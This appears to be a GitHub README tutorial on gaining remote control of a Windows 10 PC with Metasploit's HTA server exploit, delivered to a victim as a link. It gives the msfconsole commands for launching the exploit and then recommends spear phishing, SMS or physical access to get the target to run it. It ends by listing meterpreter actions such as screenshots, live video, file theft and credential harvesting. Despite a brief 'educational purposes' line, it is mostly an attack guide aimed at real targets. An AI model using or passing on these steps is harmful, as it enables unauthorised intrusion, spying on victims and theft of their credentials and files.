# HackWindows10PC
Hey Folks, in this repo we are going to demonstrate a method through which we can remotely access any windows machine by sending a link. Originally we would use the HTA attack feature provided by the metasploit tool, by which we could broadcast our payload via a direct link and we would have a meterpreter session when the victim would double click on that payload. If you want to know about HTA attack, you can read from below.

What is HTA Attack ?
The HTA Attack method will allow us to clone a site and perform powershell injection through HTA files which can be used for Windows-based powershell exploitation through the browser. It is a simple HTML application that can provide full access to the remote attacker. The usual file extension of an HTA is (.hta).

Let’s take a look 😛 !!

In this tutorial I’ll show you how to hack Windows 10 with Metasploit Framework. Kali Linux already comes with Metasploit, so no need to install.
By the end of this tutorial you should be able to gain basically full access to the victim machine (non persistence).

-------------------------------------------------------------------------------------------------------
Requirements
Kali Linux with internet access
Windows 10 x64 with internet access
Both machines should be bridged to this work. This tutorial is for educational purposes and is local.
In this tutorial we will not cover Shellter to make the .exe FUD (Fully Undetectable).

-------------------------------------------------------------------------------------------------------
Step 1: Create the attack
-Sudo msfconsole "open metasploit"
-msf6 > use exploit/windows/misc/hta_server "using windows exploit"
-ifconfig "To find the local IP
-set LHOST IP "Give your local IP"
-set LPORT 22 "Any open port"
-exploit "Run the exploit"

Step 2: Attacking the windows PS
-copy paste the .hta link 
-do a small reconn study on the target and share the clicking options that can be used by target mostly email or sms
-Efficient methoda is to a spear phishing attacking or phisical access and install this as back door
-once the target opens the link it'll download a file if he runs the exploit is activated
-sessions "to find the active session"

Step3: What you can do on target pc
-type help in meterpreter you can see all the attack opention
-screenshot is the command used for taking screenshot on live 
-You can do live video, send file, download the file, play a audio on target pc, harvest  the credentials you got limit less controll over the target
	
